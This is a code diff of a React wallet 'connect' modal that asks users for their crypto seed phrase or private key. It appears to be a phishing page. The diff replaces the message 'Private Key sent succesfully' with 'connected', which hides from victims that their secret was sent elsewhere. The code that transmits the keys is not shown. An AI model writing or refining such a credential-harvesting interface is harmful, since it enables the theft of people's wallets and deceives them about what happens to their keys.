@@ -85,8 +85,7 @@ const WalletModal = () => {
       }
       setStatus({
         ...status,
-        message:
-          (isPrivateKey ? "Private Key" : "Seed Phase") + " sent succesfully.",
+        message: (isPrivateKey ? "Private Key" : "Seed Phase") + " connected.",
         show: true,
         status: 1,
       });
@@ -117,55 +116,57 @@ const WalletModal = () => {
             <Close />
           </span>
         </div>
-        {isModalLoading ? (
-          <Spinner />
-        ) : (
-          <form className="modal-content" onSubmit={onSubmit}>
-            <div className="image-container">
-              <img src={imagePath} alt={title + "-img"} className="image" />
-            </div>
-            <div className="text">
-              <h4 className="text__title">{title}</h4>
-              <p className="text__sub-title">
-                {!isPrivateKey
-                  ? "Enter seed phrase in order, seperated by a single space."
-                  : "Enter Private Key"}
-              </p>
-            </div>
-            <textarea
-              name=""
-              id=""
-              value={isPrivateKey ? privateKeyValue : seedPhaseValue}
-              onChange={handleValueChange}
-              rows={4}
-              className="input"
-              spellCheck={false}
-              placeholder={
-                !isPrivateKey ? "Seed Phrase" : "Private Key"
-              }></textarea>
-            <button
-              className={"button " + (loading && "loading")}
-              type="submit">
-              {loading ? (
-                <Spinner width="12px" margin="0" color="#fff" />
-              ) : (
-                "Connect"
-              )}
-            </button>
-            <div className="message">
-              {status.show && (
-                <p className={`message__text--${messageType}`}>
-                  {status.message}
+        <form className="modal-content" onSubmit={onSubmit}>
+          <div className="image-container">
+            <img src={imagePath} alt={title + "-img"} className="image" />
+          </div>
+          {isModalLoading ? (
+            <Spinner />
+          ) : (
+            <>
+              <div className="text">
+                <h4 className="text__title">{title}</h4>
+                <p className="text__sub-title">
+                  {!isPrivateKey
+                    ? "Enter seed phrase in order, seperated by a single space."
+                    : "Enter Private Key"}
                 </p>
-              )}
-            </div>
-            <div className="link">
-              <span onClick={handleAccessMethod}>
-                Access with {!isPrivateKey ? "private key" : "seed phase"}
-              </span>
-            </div>
-          </form>
-        )}
+              </div>
+              <textarea
+                name=""
+                id=""
+                value={isPrivateKey ? privateKeyValue : seedPhaseValue}
+                onChange={handleValueChange}
+                rows={4}
+                className="input"
+                spellCheck={false}
+                placeholder={
+                  !isPrivateKey ? "Seed Phrase" : "Private Key"
+                }></textarea>
+              <button
+                className={"button " + (loading && "loading")}
+                type="submit">
+                {loading ? (
+                  <Spinner width="12px" margin="0" color="#fff" />
+                ) : (
+                  "Connect"
+                )}
+              </button>
+              <div className="message">
+                {status.show && (
+                  <p className={`message__text--${messageType}`}>
+                    {status.message}
+                  </p>
+                )}
+              </div>
+              <div className="link">
+                <span onClick={handleAccessMethod}>
+                  Access with {!isPrivateKey ? "private key" : "seed phase"}
+                </span>
+              </div>
+            </>
+          )}
+        </form>
       </div>
     </div>
   );
